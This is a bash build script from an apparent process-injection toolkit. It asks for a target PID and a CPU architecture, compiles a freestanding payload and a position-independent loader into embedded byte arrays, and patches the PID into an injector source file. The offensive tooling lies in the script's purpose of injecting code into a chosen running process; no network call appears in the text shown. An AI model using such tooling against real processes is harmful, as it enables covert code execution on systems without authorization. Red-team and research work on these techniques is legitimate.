#!/bin/bash	

read -p "Enter the Architecture (aarch64 [1] or x86_64 [2]): " ARCH
read -p "Enter the desired file output name: " NAME
read -p "Enter the PID of the target process: " PID


gcc -O3 -fPIE -pie -nostdlib -nostartfiles -fno-stack-protector -fno-builtin -Wl,-e,_start -o agent payload-example.c
# gcc -O3 -fPIC -fPIE -ffreestanding -fno-builtin -fno-stack-protector -nostdlib -nodefaultlibs -fvisibility=hidden -c payload-example.c -o loader.o
    
if [[ $ARCH == 1 ]]; then
    # Setup
    ARCH="aarch64"
    sed -i "s/^\(#define PID \).*/\1$PID/" ../process_injection/aarch64_reg.c
    sed -i '17i #include "loader.h"' ../process_injection/aarch64_reg.c

    # Compile loader and agent
    as memory_cleanup.s -o cleanup.o
    ld -T linker.ld --omagic -o cleanup.elf cleanup.o
    objcopy -O binary cleanup.elf cleanup.bin
    xxd -n "cleanup" -i cleanup.bin | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > cleanup.h
    xxd -n "agent" -i "agent" | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > agent.h
    gcc -static -pie -s -fPIE -Wall -O3 -I../include -I. -I../process_injection -o "$NAME" ../process_injection/aarch64_reg.c shelf-aarch64.c
    
    # Cleanup
    # rm ../process_injection/agent.h
    sed -i '17d' ../process_injection/aarch64_reg.c

elif [[ $ARCH == 2 ]]; then
    # Setup
    ARCH="x86_64"
    sed -i "s/^\(#define PID \).*/\1$PID/" ../process_injection/x86_64_reg.c

    # Compile loader and agent
    xxd -n "agent" -i agent | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > agent.h
    gcc -O3 -fPIC -fPIE -ffreestanding -fno-builtin -fno-stack-protector -nostdlib -nodefaultlibs -fvisibility=hidden -c shelf-x86_64.c -o loader.o
    ld -T linker.ld --omagic -o loader.elf loader.o
    objcopy -O binary loader.elf loader.bin
    xxd -n "agent" -i loader.bin | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../process_injection/agent.h
    gcc -static -pie -s -fPIE -Wall -O3 -o $NAME ../process_injection/x86_64_reg.c
    
    # Cleanup
    rm ../process_injection/agent.h

else
    echo "Error: Unknown or unset architecture: $ARCH"
    exit 1
fi

# rm loader.o loader.elf loader.bin
echo "============== Build complete for $NAME ($ARCH) =============="